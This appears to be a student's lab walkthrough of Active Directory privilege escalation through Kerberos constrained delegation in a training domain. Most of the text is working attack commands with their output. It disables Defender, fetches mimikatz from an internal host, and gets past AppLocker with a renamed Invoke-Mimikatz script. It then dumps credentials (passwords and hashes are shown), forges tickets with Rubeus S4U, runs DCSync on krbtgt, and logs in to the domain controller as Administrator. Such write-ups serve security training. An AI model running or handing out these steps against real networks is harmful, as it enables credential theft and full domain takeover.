#### Theory can be found in [[2. Domain Privilege Escalation#4. KCD]] ####

- student303 is a local administrator and has winrm rights over `DCORP-APPSRV` (`student303` is a member of `dcorp\RDPUsers` that has Administrative access to the computer).
```
PS C:\AD\MyTools> winrs -r:DCORP-ADMINSRV hostname;whoami /all
dcorp-adminsrv


USER INFORMATION
----------------

User Name        SID
================ =============================================
dcorp\student303 S-1-5-21-719815819-3726368948-3917688648-4103


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group
dcorp\RDPUsers                             Group            S-1-5-21-719815819-3726368948-3917688648-1123 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

- Get a `PowerShell` session at `DCORP-ADMINSRV`.
```
PS C:\AD\MyTools> Enter-PSSession -ComputerName DCORP-ADMINSRV
[DCORP-ADMINSRV]: PS C:\Users\student303\Documents>
```

- Local Enumeration on `DCORP-ADMINSRV`.
```
[DCORP-ADMINSRV]: PS C:\Users\student303\Documents> Get-MPComputerStatus


AMEngineVersion                  : 1.1.19800.4
AMProductVersion                 : 4.18.2210.6
AMRunningMode                    : Normal
AMServiceEnabled                 : True
AMServiceVersion                 : 4.18.2210.6
AntispywareEnabled               : True
AntispywareSignatureAge          : 266
AntispywareSignatureLastUpdated  : 11/14/2022 10:38:25 PM
AntispywareSignatureVersion      : 1.379.386.0
AntivirusEnabled                 : True
AntivirusSignatureAge            : 266
AntivirusSignatureLastUpdated    : 11/14/2022 10:38:25 PM
AntivirusSignatureVersion        : 1.379.386.0
BehaviorMonitorEnabled           : True
ComputerID                       : 0768675E-0583-445B-A5D0-731685CE7439

<snip>

[DCORP-ADMINSRV]: PS C:\Users\student303\Documents> net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
WDAGUtilityAccount
The command completed with one or more errors.

[DCORP-ADMINSRV]: PS C:\> dir C:\Users


    Directory: C:\Users


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        11/11/2022   5:21 AM                Administrator
d-----        11/14/2022   4:50 AM                Administrator.dcorp
d-----        11/14/2022   5:23 AM                appadmin
d-r---        11/11/2022  12:55 AM                Public
d-----          3/4/2023   1:40 AM                srvadmin
d-----          8/8/2023   3:22 AM                student303
d-----        11/14/2022   4:46 AM                websvc
```

- Use `mimikatz.exe` to dump credentials from `DCORP-APPSRV`.
```
[DCORP-ADMINSRV]: PS C:\> cd C:\Windows\Tasks
[DCORP-ADMINSRV]: PS C:\Windows\Tasks> dir
[DCORP-ADMINSRV]: PS C:\Windows\Tasks> Set-MpPreference -DisableRealtimeMonitoring $true
[DCORP-ADMINSRV]: PS C:\Windows\Tasks> wget http://172.16.99.3/mimikatz.exe -O m.exe
[DCORP-ADMINSRV]: PS C:\Windows\Tasks> .\m.exe
Program 'm.exe' failed to run: This program is blocked by group policy. For more information, contact your system
administrator.
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
```

- Enumerate the Applocker configuration on `on dcorp-adminsrv`.
```
[DCORP-ADMINSRV]: PS C:\Windows\Tasks> reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Appx
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Dll
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Exe
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Msi
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Script
[DCORP-ADMINSRV]: PS C:\Windows\Tasks> reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Exe

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Exe
    AllowWindows    REG_DWORD    0x0

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Exe\38a711c4-c0b8-46ee-98cf-c9636366548e
[DCORP-ADMINSRV]: PS C:\Windows\Tasks> reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Exe\38a711c4-c0b8-46ee-98cf-c9636366548e

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Exe\38a711c4-c0b8-46ee-98cf-c9636366548e
    Value    REG_SZ    <FilePublisherRule Id="38a711c4-c0b8-46ee-98cf-c9636366548e" Name="Signed by O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="*" BinaryName="*"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

<snip>

[DCORP-ADMINSRV]: PS C:\Windows\Tasks> reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b-934c-454f-a263-2515c8796a5d

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b-934c-454f-a263-2515c8796a5d
    Value    REG_SZ    <FilePathRule Id="06dce67b-934c-454f-a263-2515c8796a5d" Name="(Default Rule) All scripts located in the Program Files folder" Description="Allows members of the Everyone group to run scripts that are located in the Program Files folder." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePathCondition Path="%PROGRAMFILES%\*"/></Conditions></FilePathRule>

[DCORP-ADMINSRV]: PS C:\Windows\Tasks> reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\9428c672-5fc3-47f4-808a-a0011f36dd2c

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Script\9428c672-5fc3-47f4-808a-a0011f36dd2c
    Value    REG_SZ    <FilePathRule Id="9428c672-5fc3-47f4-808a-a0011f36dd2c" Name="(Default Rule) All scripts located in the Windows folder" Description="Allows members of the Everyone group to run scripts that are located in the Windows folder." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePathCondition Path="%WINDIR%\*"/></Conditions></FilePathRule>
```

- We can only run `PowerShell` scripts from either `C:\Windows` or `C:\Program Files`.
- After we modify `Invoke-Mimi.ps1` to include the function call in the script itself (`Invoke-Test -Command "sekurlsa::logonpasswords"`) we transfer the modified script (`Invoke-Test.ps1` - function is renamed as well) to the target server and run it.
```
[DCORP-ADMINSRV]: PS C:\Windows> .\Invoke-Test.ps1

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 18:36:14
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 61356 (00000000:0000efac)
Session           : Service from 0
User Name         : appadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 3/4/2023 2:15:25 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1117
        msv :
         [00000003] Primary
         * Username : appadmin
         * Domain   : dcorp
         * NTLM     : d549831a955fee51a43c83efb3928fa7
         * SHA1     : 07de541a289d45a577f68c512c304dfcbf9e4816
         * DPAPI    : a5d49d98574a7574ab70fa77797c367d
        tspkg :
        wdigest :
         * Username : appadmin
         * Domain   : dcorp
         * Password : (null)
        kerberos :
         * Username : appadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : *ActuallyTheWebServer1
        ssp :
        credman :

<snip>

Authentication Id : 0 ; 1094055 (00000000:0010b1a7)
Session           : RemoteInteractive from 2
User Name         : srvadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 3/4/2023 2:40:01 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1115
        msv :
         [00000003] Primary
         * Username : srvadmin
         * Domain   : dcorp
         * NTLM     : a98e18228819e8eec3dfa33cb68b0728
         * SHA1     : f613d1bede9a620ba16ae786e242d3027809c82a
         * DPAPI    : a593cded7a622d70818fb3315264a140
        tspkg :
        wdigest :
         * Username : srvadmin
         * Domain   : dcorp
         * Password : (null)
        kerberos :
         * Username : srvadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
        ssp :
        credman :

<snip>

Authentication Id : 0 ; 60233 (00000000:0000eb49)
Session           : Service from 0
User Name         : websvc
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 3/4/2023 2:15:25 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1114
        msv :
         [00000003] Primary
         * Username : websvc
         * Domain   : dcorp
         * NTLM     : cc098f204c5887eaa8253e7c2749156f
         * SHA1     : 36f2455c767ac9945fdc7cd276479a6a011e154b
         * DPAPI    : afa3166d71b438639f1c77118153d316
        tspkg :
        wdigest :
         * Username : websvc
         * Domain   : dcorp
         * Password : (null)
        kerberos :
         * Username : websvc
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : AServicewhichIsNotM3@nttoBe
        ssp :
        credman :
```

- Enumerate local admin rights to domain computers for `dcorp\appadmin`.
```
PS C:\AD\MyTools> $appadminpasswd = ConvertTo-SecureString -AsPlainText -Force -String "*ActuallyTheWebServer1"
PS C:\AD\MyTools> $appadmincred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "dcorp\appadmin",$appadminpasswd
PS C:\AD\MyTools> foreach($line in Get-Content .\hosts.txt) {Test-AdminAccess -ComputerName $line -Credential $appadmincred -WarningAction SilentlyContinue}

ComputerName IsAdmin
------------ -------
cn             False
DCORP-DC       False
DCORP-ADM...    True
DCORP-APPSRV    True
DCORP-CI       False
DCORP-MGMT     False
DCORP-MSSQL    False
DCORP-SQL1     False
```

- Enumerate local admin rights to domain computers for `dcorp\websvc`.
```
PS C:\AD\MyTools> $websvcpasswd = ConvertTo-SecureString -AsPlainText -Force -String "AServicewhichIsNotM3@nttoBe"
PS C:\AD\MyTools> $websvccred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "dcorp\websvc",$websvcpasswd
PS C:\AD\MyTools> foreach($line in Get-Content .\hosts.txt) {Test-AdminAccess -ComputerName $line -Credential $websvccred -WarningAction SilentlyContinue}

ComputerName IsAdmin
------------ -------
cn             False
DCORP-DC       False
DCORP-ADM...   False
DCORP-APPSRV   False
DCORP-CI       False
DCORP-MGMT     False
DCORP-MSSQL    False
DCORP-SQL1     False
```

- Find accounts (users or computers) with Constrained Delegation privileges.
```
PS C:\AD\MyTools> Get-DomainComputer -TrustedToAuth | select samaccountname,msds-allowedtodelegateto

samaccountname  msds-allowedtodelegateto
--------------  ------------------------
DCORP-ADMINSRV$ {TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL, TIME/dcorp-DC}


PS C:\AD\MyTools> Get-DomainUser -TrustedToAuth | select samaccountname,msds-allowedtodelegateto

samaccountname msds-allowedtodelegateto
-------------- ------------------------
websvc         {CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL, CIFS/dcorp-mssql}
```

- Exploit the KCD.
```
PS C:\AD\MyTools> .\Rubeus.exe s4u /nowrap /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /impersonateuser:Administrator /domain:dollarcorp.moneycorp.local /user:dcorp-adminsrv$ /rc4:b5f451985fd34d58d5120816d31b5565 /altservice:http,host,ldap,cifs /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: S4U

[*] Using rc4_hmac hash: b5f451985fd34d58d5120816d31b5565
[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\dcorp-adminsrv$'
[*] Using domain controller: 172.16.2.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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


[*] Action: S4U

[*] Building S4U2self request for: 'dcorp-adminsrv$@DOLLARCORP.MONEYCORP.LOCAL'
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[*] Sending S4U2self request to 172.16.2.1:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'dcorp-adminsrv$@DOLLARCORP.MONEYCORP.LOCAL'
[*] base64(ticket.kirbi):

      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

[*] Impersonating user 'Administrator' to target SPN 'time/dcorp-dc.dollarcorp.moneycorp.LOCAL'
[*]   Final ticket will be for the alternate service 'http'
[*] Building S4U2proxy request for service: 'time/dcorp-dc.dollarcorp.moneycorp.LOCAL'
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[*] Sending S4U2proxy request to domain controller 172.16.2.1:88
[+] S4U2proxy success!
[*] Substituting alternative service name 'http'
[*] base64(ticket.kirbi) for SPN 'http/dcorp-dc.dollarcorp.moneycorp.LOCAL':

<snip>

PS C:\AD\MyTools> klist

Current LogonId is 0:0x3f47b03

Cached Tickets: (1)

#0>     Client: Administrator @ DOLLARCORP.MONEYCORP.LOCAL
        Server: http/dcorp-dc.dollarcorp.moneycorp.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 8/8/2023 12:35:14 (local)
        End Time:   8/8/2023 22:35:13 (local)
        Renew Time: 8/15/2023 12:35:13 (local)
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:

<snip>

PS C:\AD\MyTools> .\mimikatz.exe  "lsadump::dcsync /user:dcorp\krbtgt" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::dcsync /user:dcorp\krbtgt
[DC] 'dollarcorp.moneycorp.local' will be the domain
[DC] 'dcorp-dc.dollarcorp.moneycorp.local' will be the DC server
[DC] 'dcorp\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/11/2022 10:59:41 PM
Object Security ID   : S-1-5-21-719815819-3726368948-3917688648-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 4e9815869d2090ccfca61c1fe0d23986
    ntlm- 0: 4e9815869d2090ccfca61c1fe0d23986
    lm  - 0: ea03581a1268674a828bde6ab09db837

<snip>

PS C:\AD\MyTools> Enter-PSSession -ComputerName DCORP-DC.DOLLARCORP.MONEYCORP.LOCAL
[DCORP-DC.DOLLARCORP.MONEYCORP.LOCAL]: PS C:\Users\Administrator\Documents> HOSTNAME
dcorp-dc
[DCORP-DC.DOLLARCORP.MONEYCORP.LOCAL]: PS C:\Users\Administrator\Documents> whoami
dcorp\administrator
[DCORP-DC.DOLLARCORP.MONEYCORP.LOCAL]: PS C:\Users\Administrator\Documents>
```

